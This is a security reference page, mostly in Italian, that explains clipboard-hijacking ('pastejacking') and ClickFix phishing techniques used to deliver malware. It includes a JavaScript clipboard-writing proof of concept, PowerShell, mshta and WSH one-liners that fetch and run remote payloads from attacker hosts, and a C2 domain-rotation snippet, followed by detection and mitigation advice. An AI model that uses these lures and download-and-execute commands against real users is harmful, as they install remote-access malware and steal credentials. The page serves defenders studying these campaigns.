# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Non incollare mai nulla che non hai copiato tu stesso." – consiglio vecchio ma ancora valido

## Panoramica

Clipboard hijacking – also known as *pastejacking* – sfrutta il fatto che gli utenti copiano e incollano comandi senza ispezionarli. Una pagina web malevola (o qualsiasi contesto capace di eseguire JavaScript, come un'app Electron o Desktop) inserisce programmaticamente testo controllato dall'attaccante negli appunti di sistema. Le vittime sono indotte, di solito tramite istruzioni di social engineering accuratamente confezionate, a premere **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), oppure aprire un terminal e *incollare* il contenuto degli appunti, eseguendo immediatamente comandi arbitrari.

Poiché **non viene scaricato alcun file e non viene aperto alcun allegato**, la tecnica bypassa la maggior parte dei controlli di sicurezza per e-mail e contenuti web che monitorano allegati, macro o l'esecuzione diretta di comandi. L'attacco è quindi popolare nelle campagne di phishing che distribuiscono famiglie di malware commodity come NetSupport RAT, Latrodectus loader o Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campagne più vecchie usavano `document.execCommand('copy')`, quelle più recenti si basano sulla **Clipboard API** asincrona (`navigator.clipboard.writeText`).

## Il flusso ClickFix / ClearFake

1. L'utente visita un sito typosquattato o compromesso (es. `docusign.sa[.]com`)
2. Il JavaScript **ClearFake** iniettato richiama l'helper `unsecuredCopyToClipboard()` che memorizza silenziosamente nella clipboard un one-liner PowerShell codificato in Base64.
3. Le istruzioni HTML dicono alla vittima: *“Premere **Win + R**, incollare il comando e premere Invio per risolvere il problema.”*
4. `powershell.exe` esegue, scaricando un archivio che contiene un eseguibile legittimo più una DLL malevola (classico DLL sideloading).
5. Il loader decifra ulteriori stage, inietta shellcode e installa persistenza (es. scheduled task) – infine esegue NetSupport RAT / Latrodectus / Lumma Stealer.

### Esempio di catena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legittimo) cerca nella propria directory `msvcp140.dll`.
* La DLL malevola risolve dinamicamente le API con **GetProcAddress**, scarica due binari (`data_3.bin`, `data_4.bin`) tramite **curl.exe**, li decripta usando una chiave XOR a rotazione `"https://google.com/"`, inietta lo shellcode finale e estrae **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Scarica `la.txt` con **curl.exe**
2. Esegue il JScript downloader dentro **cscript.exe**
3. Recupera un MSI payload → deposita `libcef.dll` accanto a un'applicazione firmata → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer tramite MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La chiamata **mshta** avvia uno script PowerShell nascosto che recupera `PartyContinued.exe`, estrae `Boat.pst` (CAB), ricostruisce `AutoIt3.exe` tramite `extrac32` e concatenazione di file e infine esegue uno script `.a3x` che esfiltra le credenziali del browser verso `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK con C2 rotante (PureHVNC)

Alcune campagne ClickFix evitano completamente i download di file e istruiscono le vittime a incollare un one‑liner che recupera ed esegue JavaScript tramite WSH, lo rende persistente e ruota il C2 quotidianamente. Esempio di catena osservata:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caratteristiche principali
- URL offuscato invertito a runtime per eludere l'ispezione superficiale.
- JavaScript si rende persistente tramite uno Startup LNK (WScript/CScript) e seleziona il C2 in base al giorno corrente – permettendo una rapida domain rotation.

Frammento JS minimo usato per ruotare i C2 in base alla data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La fase successiva solitamente distribuisce un loader che stabilisce persistenza e scarica un RAT (e.g., PureHVNC), spesso pinning TLS a un certificato hardcoded e chunking del traffico.

Detection ideas specific to this variant
- Albero dei processi: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Artefatti di avvio: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` che invoca WScript/CScript con un percorso JS sotto `%TEMP%`/`%APPDATA%`.
- Registro/RunMRU e telemetria della riga di comando contenente `.split('').reverse().join('')` o `eval(a.responseText)`.
- Ripetute esecuzioni di `powershell -NoProfile -NonInteractive -Command -` con grandi payload su stdin per alimentare script lunghi senza linee di comando estese.
- Scheduled Tasks che successivamente eseguono LOLBins come `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sotto un'attività/percorso dall'aspetto di un updater (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostname e URL C2 che ruotano quotidianamente con pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlare eventi di scrittura nella clipboard seguiti da incolla Win+R e immediata esecuzione di `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *digitare* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
